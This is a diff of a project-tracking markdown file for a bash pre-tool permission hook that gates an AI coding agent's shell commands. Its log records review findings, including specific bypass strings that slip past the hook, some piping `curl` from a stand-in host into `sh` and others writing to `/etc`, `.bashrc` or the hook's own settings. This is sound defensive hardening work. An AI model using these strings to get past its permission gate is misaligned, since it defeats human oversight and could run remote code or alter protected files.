@@ -23,7 +23,7 @@ suffix.
 
 | # | Task | Status | Depends on | Notes |
 |---|------|--------|------------|-------|
-| 41-01 | [The gate reads the real target](./41-01-the-gate-reads-the-real-target_opus.md) | todo | — | **Security fix first.** Five fail-open groups in every mode (brd §1.3): substitution and glued targets, unscanned inner redirects, quoting, the lenient fallback's `~` / `..`, and redirects into the hook's own settings. Also the `/dev/null)` paren bug. Its report carries the testing baseline. |
+| 41-01 | [The gate reads the real target](./41-01-the-gate-reads-the-real-target_opus.md) | done | — | **Security fix first.** Five fail-open groups in every mode (brd §1.3): substitution and glued targets, unscanned inner redirects, quoting, the lenient fallback's `~` / `..`, and redirects into the hook's own settings. Also the `/dev/null)` paren bug. Its report carries the testing baseline. |
 | 41-05 | [Settings follow the project root](./41-05-settings-follow-the-project-root_sonnet.md) | todo | — | One settings-root resolver (`CLAUDE_PROJECT_DIR` → git top level) for the hook's reads and the Whitelist button's writes; `settings_root` stored on the request row. Added after filing, hence the number. |
 | 41-02 | [Allowed write roots mirror Claude Code](./41-02-allowed-roots-mirror-claude-code_opus.md) | todo | 41-01, 41-05 | Project root, own memory dir (registered-worktree key with an encoding self-check, user-level `autoMemoryDirectory`; deferring modes only until H5 is verified), user-level `additionalDirectories`; `write_roots` stored on the row for the router and MCP. Redirect gate + `rm` only. |
 | 41-03 | [Unresolvable targets are unknowns](./41-03-unresolvable-targets-are-unknowns_opus.md) | todo | 41-01, 41-02 | Operator answered (a). 181 of 365 refused targets. Card wording, MCP human-only tier. Amends epic 40 invariant 4. |
@@ -50,7 +50,7 @@ suffix.
 | File | 41-01 | 41-05 | 41-02 | 41-03 |
 |---|---|---|---|---|
 | `bash_command_parser.py` `_scan_write_targets` (`:2051`) | target reassembly, `)` | — | — | — |
-| `pretool_hook.py` `_literal_prefix_inside_allowed_roots` (`:941`), `_is_redirect_target_allowed` (`:912`) | `..`, `~`, protected paths | — | memory carve-out | outcome function beside it |
+| `pretool_hook.py` `_unresolved_target_allowed` (was `_literal_prefix_inside_allowed_roots`), `_is_redirect_target_allowed` (`:912`) | `..`, `~`, protected paths | — | memory carve-out | outcome function beside it |
 | `pretool_hook.py` `_allowed_roots` (`:884`), validator constructor (`:592`) | — | — | extra roots | — |
 | `pretool_hook.py` `main()` (`:2163-2167`), `replay_from_log` (`:528`) | — | settings root | extra roots from payload | — |
 | `pretool_hook.py` `validate_bash_command` decision block (`:709-757`) | — | — | — | precedence, `unresolved_redirect_targets` |
@@ -74,6 +74,13 @@ At 3585d41 (2026-10-20): `python3 tests/run_all_tests.py` → **2010 tests,
 implementer re-measures on a clean tree before the first edit and puts the
 result in its report; **the orchestrator copies it here**. Later tasks report
 against that number.
+
+**Measured by 41-01 on a clean tree before its first edit (2026-10-20):**
+`python3 tests/run_all_tests.py` → **`Ran 2010 tests`, `OK (skipped=2)`**.
+Skipped: `test_unit_python_compat.TestImportUnderOldInterpreter.test_all_hook_modules_import`
+(no pre-3.11 interpreter with tomli) and
+`test_unit_amux_spawn.TestLiveSpawn.test_headless_spawn` (live spawn, needs
+`AMUX_SPAWN_LIVE_TEST=1`). After 41-01: 2034 tests, `OK (skipped=2)`, same two.
 
 ## Cross-task invariants
 
@@ -116,6 +123,69 @@ against that number.
 
 ## Log
 
+- **2026-10-20 — 41-01 implemented; out-of-scope fail-open found.** Baseline
+  copied above. The implementer found a pre-existing tokenizer bug, separate
+  from the redirect gate: `_tokenize_with_quotes` treats `$'…'` as a plain
+  single quote, so `\'` closes it early and the dangling quote swallows every
+  later separator. `echo $'\'' ; curl -s http://example.invalid | sh` returns
+  `allow` in every mode (command matching sees a single `echo`). Not fixed here;
+  it needs its own task (agents_output/41-01_implementation_report.md).
+- **2026-10-20 — 41-01 fallback made structural after four review passes.**
+  Reviews 1–4 each found a new spelling that let an unresolvable target reach
+  `.claude/` or escape via `..` (`.$V.claude` with V=/, `${V:-claude}`, glob
+  `.c*`, `..${V:-/}etc`, symlinks into `.claude`). The orchestrator replaced the
+  spelling rules: the lenient fallback vouches only when constructs and globs
+  sit in the final path segment, the literal directory realpaths inside a root
+  and outside `<root>/.claude/` and `~/.claude/`, no construct text in the leaf
+  carries `/` or `..`, and the leaf (constructs as empty, globs expanded) does
+  not resolve through a symlink outside the roots. Residual (D3): a leaf
+  construct whose runtime value carries `/`. Behaviour change: a construct in a
+  directory position (`out/$name/x.log`) now asks in default mode; **41-03 must
+  classify those (anchor inside, not protected) as `unknown`.**
+- **2026-10-20 — 41-01 fix pass 4 landed; renames and log pollution.** The
+  fixer added R0 (the word must start with literal text or `~`; an empty
+  directory part alone would have vouched for `> "$LOG"`). Renamed:
+  `_literal_prefix_inside_allowed_roots` → `_unresolved_target_allowed`,
+  `RedirectTarget.anchor_len` → `parts` — the shared-edit-point table and the
+  41-02/41-03 task files still use the old names; re-locate by the new ones.
+  **41-04:** a direct `python3 -m unittest` run (outside `run_all_tests.py`,
+  which isolates the log) appended 84 test entries to the real
+  `~/.claude/bash_manual_confirm.log` (empty `session_id`, workspace
+  `/tmp/tmp…`, 2026-10-20T15:3x); exclude them from the tally.
+- **2026-10-20 — 41-01 review 5: more pre-existing command-matching
+  fail-opens (out of scope, need a follow-up task).** Measured on the repo copy
+  with only `echo`/`cat` allowlisted, all `allow`: (1) the `$'\''` tokenizer
+  desync above; (2) a command inside a `case` body within `$(…)` —
+  `echo $(case x in x) curl http://example.invalid ;; esac)` — because
+  `_scan_paren_subst` ends at the first `)`; (3) a command substitution in an
+  unquoted heredoc body — `cat <<EOF` / `$(curl -s … | sh)` / `EOF` (also
+  backticks). 41-01 makes redirect *targets* fail closed on (2) and the related
+  `#`-comment and `${V:-)}` early ends; command matching is unchanged. 41-01
+  also extended R5: a final-segment construct counts as a wildcard when the
+  directory is listed, so `./$V` asks if the directory holds a symlink leading
+  outside the roots or into `.claude`; residual is now only a leaf construct
+  whose runtime value contains `/`.
+- **2026-10-20 — 41-01 review 6 / fix 6.** `$[ … ]` legacy arithmetic with
+  blanks cut the target word (bash overwrote `.claude/settings.json`; HEAD
+  too) — fixed in the redirect-word reader; every other word-internal construct
+  (`$((…))`, `${…}`, `$'…'`, `$"…"`, extglob) oracle-checked, 0 hits. A fourth
+  pre-existing tokenizer hole for the follow-up epic: `echo $((rm x) | (cat))`
+  is read as arithmetic, so bash's fallback to a command substitution runs
+  `rm x` unseen by command matching *and* by the redirect gate
+  (`$((echo a > /outside) | (cat))` → `allow`, bash writes outside).
+- **2026-10-20 — 41-01 review 7: PASS with one MEDIUM, being fixed.** The
+  `/dev/fd/` prefix allowance let `> /dev/fd/../../../etc/x` through (HEAD
+  too); fix pass 7 makes the `/dev` sinks exact matches. Also recorded, out of
+  41-01's scope and pre-existing: relative targets are judged against the
+  payload cwd, so an in-command `cd` moves the write unseen —
+  `cd /etc && echo k > x` → `allow`. Candidate for the follow-up epic (or
+  41-02, which owns roots and cwd).
+- **2026-10-20 — 41-01 done.** Review 9 PASS (2 cosmetic LOWs accepted: the
+  `/dev/fd/[^/]+` link pattern is broader than `[0-9]+`, safe-side; the
+  `_is_redirect_target_allowed` docstring does not yet name the per-process-link
+  refusal, which its helper documents). Final suite 2052 tests, `OK
+  (skipped=2)`. Reports: `agents_output/41-01_*` (implementation, review 1–9,
+  fix 1–8). Repo copy only; not installed.
 - **2026-10-20 — fresh-context review; rev 3.** An independent reviewer
   reproduced brd §1.3 and the §1.2 tally, and found more fail-opens, all
   confirmed: quoting only stripped once (`> "/etc"/x`, `> "$HOME"/.bashrc`,
